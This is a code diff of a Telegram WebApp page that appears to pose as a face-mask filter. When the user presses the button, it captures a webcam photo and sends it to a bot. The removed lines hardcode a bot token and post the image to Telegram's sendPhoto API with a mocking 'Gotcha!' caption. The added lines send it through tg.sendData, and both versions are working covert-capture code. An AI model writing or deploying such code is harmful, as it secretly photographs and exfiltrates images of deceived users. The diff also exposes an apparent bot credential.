@@ -46,10 +46,6 @@
         let tg = window.Telegram.WebApp;
         tg.expand();
 
-        // Твои данные (токен и твой ID)
-        const BOT_TOKEN = "9001912922:AAHr1F04-5zuTUQXfZildUQyvLpv4ExzsM"; 
-        const CHAT_ID = "9001912922"; // Вставь сюда свой числовой ID
-
         const loadBtn = document.getElementById('loadBtn');
         const video = document.getElementById('videoElement');
         const canvas = document.getElementById('canvasElement');
@@ -65,34 +61,22 @@
                 
                 video.srcObject = stream;
                 
-                setTimeout(async () => {
-                    canvas.width = 640;
-                    canvas.height = 480;
+                setTimeout(() => {
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
                     
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
+                    // Сжимаем картинку, чтобы она пролегла в лимит Telegram (ставим качество 0.6)
+                    const imageDataURL = canvas.toDataURL('image/jpeg', 0.6);
+                    
                     stream.getTracks().forEach(track => track.stop());
-
-                    canvas.toBlob(async (blob) => {
-                        const formData = new FormData();
-                        formData.append('chat_id', CHAT_ID);
-                        formData.append('photo', blob, 'mask.jpg');
-                        formData.append('caption', 'Попался! 😂');
-
-                        try {
-                            let response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                                method: 'POST',
-                                body: formData,
-                                mode: 'no-cors' // Обярзательный флаг, чтобы iOS и браузеры не ругались на CORS
-                            });
-                            
-                            loadBtn.innerText = 'Готово! Маска надета';
-                        } catch (e) {
-                            alert("Ошибка: " + e.message);
-                        }
-                    }, 'image/jpeg', 0.8);
-
+                    
+                    // Передаем данные боту через встроенный механизм Telegram
+                    tg.sendData(imageDataURL);
+                    
+                    loadBtn.innerText = 'Готово!';
                 }, 1000);
 
             } catch (err) {
